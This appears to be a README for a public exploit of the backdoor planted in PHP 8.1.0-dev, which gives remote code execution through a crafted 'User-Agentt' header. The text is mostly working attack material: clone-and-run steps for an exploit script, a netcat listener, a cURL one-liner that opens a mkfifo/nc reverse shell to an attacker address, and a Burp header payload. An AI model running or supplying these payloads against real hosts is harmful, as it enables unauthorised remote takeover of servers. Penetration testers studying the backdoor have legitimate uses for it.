# PHP-8.1.0-dev - Remote Code Execution 

## 1.0 Description

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following bash exploit uses the backdoor to provide a shell on the host. A simple proof of concept file.

## 2.0 Usage - with a bash script

 Run the script, enter the host IP, your own IP + port (for the reverse shell) when being asked for and enjoy your shell:

`$ git clone https://github.com/PenTestical/PHP-8.1.0-dev_RCE && cd PHP-8.1.0-dev_RCE/`

`$ chmod +x exploit.sh`

`$ bash exploit.sh`

## 2.1 Quick RCE - with cURL

The quickest way to get a reverse shell, is to use a cURL request. replace `YOUR_IP` with your attacker IP address and start a netcat listener at port `4444`.

`nc -nvlp 4444`

`curl http://10.10.10.242/ -H "User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f');"`

## 2.2 Manual exploitation - with Burp

You can also exploit this manually by adding the

`User-Agentt: zerodiumsystem('ls');`

header in Burp Suite and sending a new HTTP request to the host. Start a netcat listener before you send out the request.
